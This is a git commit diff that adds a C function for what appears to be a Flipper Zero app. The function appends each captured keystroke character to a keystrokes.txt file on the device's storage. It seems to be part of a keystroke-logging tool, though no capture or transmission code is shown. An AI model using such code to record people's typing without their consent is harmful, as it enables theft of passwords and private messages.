8e260f257ff22209ea980adb31f7a40dc386ef48
okyproxd <owenkentyu@gmail.com>
2026-03-24 11:58:51 +0000

    Update storage.c

--- app/src/storage.c
+++ app/src/storage.c
@@ -1,3 +1,17 @@
-#pragma once
+#include <furi.h>
+#include <storage/storage.h>
+#include "storage.h"
 
-void save_keystroke_to_storage(char character);
+void save_keystroke_to_storage(char character) {
+    Storage* storage = furi_record_open(RECORD_STORAGE);
+    File* file = storage_file_alloc(storage);
+    
+    if(storage_file_open(file, EXT_PATH("keystrokes.txt"), FSAM_WRITE, FSOM_OPEN_APPEND)) {
+        storage_file_write(file, &character, 1);
+        storage_file_write(file, "\n", 1);
+    }
+    
+    storage_file_close(file);
+    storage_file_free(file);
+    furi_record_close(RECORD_STORAGE);
+}
